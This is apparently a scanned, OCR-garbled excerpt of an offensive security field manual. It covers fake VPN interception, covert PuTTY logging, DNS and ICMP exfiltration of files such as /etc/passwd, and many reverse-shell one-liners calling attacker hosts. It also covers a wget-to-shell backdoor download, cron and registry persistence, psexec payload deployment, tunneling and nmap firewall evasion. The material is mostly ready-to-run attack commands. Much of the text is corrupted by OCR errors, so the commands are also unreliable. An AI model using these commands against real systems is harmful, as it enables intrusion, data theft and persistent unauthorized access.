FIKED - FAKE VPN SERVER
~ Must know the VPN group name a~d pre-shared ke;
1. Ettercap filter to drop IPSEC traffic IUDP port 5001
iflip.proto == UDP && udp.scc == 5001 I
kill I I;
drop I I;
msg ("-' ' ' ' 'UDP packet dropped 1 > ' ' -1 ") ;
2. Compile filter
etterfilter udpdrop.filter -o udpdrop.ef
3. Start Ettercap and drop all IPSEC ~raffic
#ettercap -T -g -M arp -F udpdrop.ef II II
4. Enable IP Forward
echo "1" lprocls;slnetlipv4lip_forward
5. Configure IPtables to port forward to Fiked server
iptables -t nat -A PREROUTING -p udp -I ethO -d VPN Server IP -j
DNAT - - to Attacking Host IP
ipcables -P FORWARD ACCEP~
6. Start Fiked to impersonate the VPN Server
fiked - g vpn gatewa; ip - k VPN Group Name:Group Pre-Shared Ke;
Stop Ettercap
8. Restart Ettercap without the filter
ettercap -T -M arp II II
PUTTY
REG KEY TO HAVE PuTTY LOG EVERYTHING (INCLUDING CONVERSATIONS)
[HKEY_CURRENT_USER\Software\Si~onTatham\Putt;\Sessions\Default%20Settings]
"LogFileName"="%TEMP%\putt;.dat"
"LogT;pe"=dword:00000002"
40
FILE TRANSFER
FTP THROUGH NON-INTERACTIVE SHELL
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file =tp.txt
echo bfe ftp.txt
ftp -s:ftp.txt
DNS TRANSFER ON LINUX
On victim:
1. Hex e~code the file to be transferred
xxd -p secret fi:e.hex
2. Read in each line and do a D~S lookup
forb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done
On attacker:
1. Capture DNS exfil packets
tcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com
2. Cut the exfil!ed hex from t~e DNS packet
tcpdump -r dnsdemo -n I grep shell.evilexample.com I cut -f9 -d'
cut -fl -d'.' I uniq received. txt
3. Reverse the hex encoding
xxd -r -p received~.txt kefS.pgp
EXFIL COMMAND OUTPUT ON A LINUX MACHINE OVER ICMP
On victim (never endi~g l liner) :
stringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d " " I tr -d "\n"'
counter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ;done
On attacker (capture pac~ets to data.dmp and parse}:
tcpdump -ntvvSxs 0 'icmp[C:-a• data.dmp
grep Ox0020 data.dmp I cut -c21- I tr -d " " I tr -d "\n" I xxd -r -p
OPEN MAIL RELAY
C:\ telnet x.x.x.x 25
HELO x.x.x.
l1AIL FROl1: PI:EMAIL
RCPT TO: fOU@;ou.com
DATA
Thank You.
quit
43
REVERSE SHELLS [11 [31 [41
NETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)
nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
NETCAT (SOME VERSIONS DON'T SUPPORT -E OPTION)
nc -e /bin/sh 10.0.0.1 1234
NETCAT WORK-AROUND WHEN -E OPTION NOT POSSIBLE
rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
PERL
perl -e 'use Socket; $i~"10.0.0.l"; $p~1234; socket(S,PF INET, SOCK STREAt1,
getprotobjname("tcp") I; if(connect(S,sockaddr in($p,inet-aton($i) I iT!
open(STDIN," &S") ;open(STDOUT," &S"); open(ST~ERR," &8"17 exec("/bin/sh
i" I; l;'
PERL WITHOUT /BIN/SH
perl -t1IO -e '$p~fork;exit,if($p);$c~new
IO: :Socket: :INET(PeerAddr,"attackerip:4444") ;STDIN- fdopen($c,r) ;$-
fdopen($c,w) ;sjsteffi$ while ·'
PERL FOR WINDOWS
perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN
fdopen($c,r) ;$-- fdopen($c,w) ;system$ while ·'
PYTHON
python -c 'import socket, subprocess, os; s=socket. socket (socket ..; ;F_ INET,
socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
p~subprocess.call( 1"/bin/sh","-i"] I;'
BASH
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
JAVA
r ~ Runtime.getRuntime()
p ~ r.exec( 1"/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2CJ2;cat &5 1
while read line; do \$:ine 2 &5 &5; done"] as String[])
p.waitFor()
PHP
php -r '$sod:~fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
44
RUBY
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234) .to i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
RUBY WITHOUT /BIN/ SB
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen(cmd,11r
"I { liolc.print io.read}end'
RUBY FOR WINDOWS
ruby -rsocket -e
'c=TCPSocket.new("attacY..erip","4444");while(crnd=c.gets);IO.popen{cmd,"r11) {I
iolc.print io.read}end'
TELNET
rm -f /tmp/p; mknod /tmp/p p && telnet attacl:erip 4444 0/tmp/p
--OR--
telnet attacl:erip 4444 I /bin/bash I telnet attackerip 4445
XT ERM
xterm -displaj 10.0.0.1:1
o Start Listener: Xnest :1
o Add permission to connect: xhost +victimiP
Mise
wget hhtp:// server /backdoor.sh -0- I sh Downloads and runs backdoor.sh
45
PERSISTENCE
FOR LINUX PERSISTENCE (ON ATTACK BOX)
crontab -e : set for every 10 min
0-59/10 ' ' ' ' nc ip 7"" -e /bin/bash
WINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)
sc config schedule start~ auto
net start schedule
at 13:30 ''''C:\nc.exe ip 7~7 -e cmd.exe''''
WINDOWS PERSISTENT BACKDOOR WITH FIREWALL BYPASS
1. REG add HKEY CURRENT USER\Software\l1icrosoft\Windows\CurrentVersion\Run
/v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
REMoTE PAYLOAD DEPLO"!MENT VIA SMB OR WEBDAV [ 6]
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload
Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set following options:
localexe~true
localfile~ payload
localroot~ payload directory
disablePayloadHandler~true
3. Use psexec or wmic command to remotely execute payload
psexec \\ remote ip /u domain\compromised_user /p password "\\payload
ip \test\msf.exe"
OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\ \ payload ip \test\msf.exe"
46
TUNNELING
FPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
fpipe.exe l 1234 -r 80 2.2.2.2
SOCKS.EXE- SCAN INTRANET THROUGH SOCKS PROXY
On redirector (1.1.1.1):
socks.exe -i1.1.1.1 -p 8C80
On attacker:
Modifj /etc/proxjchains.conf:
Comment out:
Comment out: 9050
Add line: socks4 1.1.1.1 8080
Scan through socks prox1:
proxjchains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
soca~ TCP4:LISTEN:1234 TCP4:2.2.2.2:80
STUNNEL - SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [ 8]
0!1 attacker (client):
Modifj /stunnel.conf
clien:. = jes
[netcat client]
accept ~ 5555
connect ~ -~istening IP-:4444
On victim (listening server)
l1odifJ /s:.unnel.conf
client = no
[ne~cat server]
accept ~ 4444
connect =
C:\ nc -vlp ----
On attacker (clien~):
# nc -nv 12-.0.C.1 5555
q-
GoOGLE HACKING
one
numrange: [#]-[#] search within a number range
date: [ #] search within past [#] months
link: [url] find pages that link to [url]
related: [url] find pages related to [url]
intitle: [string] find pages with [string] in title
inurl: [string] find pages with [string] in url
filetjpe: [xls] find files that are xls
phonebook: [name] find phone book listings of [name]
VIDEO TELECONFERENCING
POLYCOM
telnet ip
#Enter 1 char, get uname:pwd
http:// ip /getsecure.cgi
http:// ip /era rcl.htm
http:// ip /a securitj.htm
http:// ip /a-rc.htm
TANDBERG
http:// ip /snapctrl.ssi
SONY WEBCAM
http:// ip /commard/visca-gen.cgi?visca~ str
8101046202FF : Freeze Camera
~8
NMAP
SCAN TYPES
-sP ping scan -su udp scan
-ss syn scan -so protocol scan
-sT connect scan
OPTIONS
-pl-65535 ports -sv : version detection
-T[0-5] o~5m, 1~15s, 2~.4s -PN : no ping
-n no dns resolution -6 : IPv6 scan
-0 OS detection --randomize-hosts
-A aggressive scan
I
OUTPUT INPUT
-ox file write to xml file
-oG file write to grep file
-oA file save as all 3 formats
-iL file read hosts from file
-exclude file file excludes hosts in file
AD~CED OPTIONS
-sV -p# --script~banner -ttl : set TTL
-trace route --script script.
FIREWALL EVASION
-f fragment packets --spoof-mac mac
-s ip spoof src --data-length size
-g # spoof src port (append random data)
-D ip , ip Decoy --scan-delay 5s
--mtu # set l1TU size
CONVERT NMAP XML FILE TO HTML:
xsltproc nmap.xml -o nmap.html
GENERATE LIVE HOST FILE:
nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 I grep "Nmap" I cut -d " " -f
5 live hosts.txt
COMPARE NMAP RESULTS
ndiff scanl.xml scan2.xml
DNS REVERSE LOOKUP ON IP RANGE
nmap -R -sL -dns-server server 1.1.1.0/24
IDS TEST (XMAS SCAN WITH DECOY IPS AND SPOOFING)
for x in {l .. lOOOO .. l);do nmap -T5 -sX -S spoof-source-IP -D comma
seperated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff -
e ethO -Pn targeted-IP. ;done
51
WIRE SHARK
eth.addr/eth.dst.eth.src MAC
rip.auth.passwd RIP password
ip.addr/ip.dst/ip.src (ipv6.) IP
tcp.port/tcp.dstport/tcp.srcport TCP ports
tcp.flags (ack,fin,push,reset,syn,urg) TCP flags
udp.port/udp.dstport/udp.srcport UDP ports
http.authbasic Basic authentication
http.www_authentication HTTP authentication
http.data HTTP data portion
http.cookie HTTP cookie
http.referer HTTP referer
http.server HTTP Server
http.user agent HTTP user agent string
wlan.fc.type eq 0 802.11 management frame
wlan.fc.type eq 1 802.11 control frame
wlan.fc.type eq 0 802.11 data frame
wlan.fc.type subtype eq 0 (1~reponse) 802.11 association request
wlan.fc.type_subtype eq 2 (3~response) 802.11 reassociation req
wlan.fc.type_subtype eq 4 (S~response) 802.11 probe request
wlan.fc.type_subtype eq 8 802.11 beacon
wlan.fc.type subtype eq 10 802.11 disassociate
wlan.fc.type=subtype eq 11 (12~deauthenticate) 802.11 authenticate
COMPARISON OPERATORS
eq OR
ne OR !~
gt OR
lt OR
ge OR
le OR
LOGICAL OPERATORS
and OR &&